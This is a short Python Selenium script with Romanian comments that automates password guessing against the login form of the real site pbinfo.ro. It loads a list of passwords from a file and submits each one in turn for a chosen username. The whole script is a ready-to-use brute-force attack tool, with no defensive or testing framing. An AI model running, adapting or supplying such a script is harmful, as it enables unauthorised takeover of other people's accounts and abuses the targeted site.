from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
import time


PATH = "C:\Program Files (x86)\chromedriver.exe" # puneti unde este locat chromedriver.exe

driver = webdriver.Chrome(PATH)
username = "pbinfouser" # pune numele userului aici

passwords = open('pbinfopasswords.txt',"r") # puneți fișierul cu parole aici 
Lines = passwords.readlines()
for line in Lines:
 driver.get("https://www.pbinfo.ro/")
 driver.find_element(By.CSS_SELECTOR,"#navbar > ul.nav.navbar-nav.navbar-right > li:nth-child(1) > a").click()
 time.sleep(1)
 driver.find_element(By.ID,"user_login").send_keys(username)
 driver.find_element(By.CSS_SELECTOR,"#parola_login").send_keys(line.strip())
 driver.find_element(By.CSS_SELECTOR,"#form-login-modal > div.modal-footer > div:nth-child(1) > div > button.btn.btn-primary").click()
 time.sleep(4)

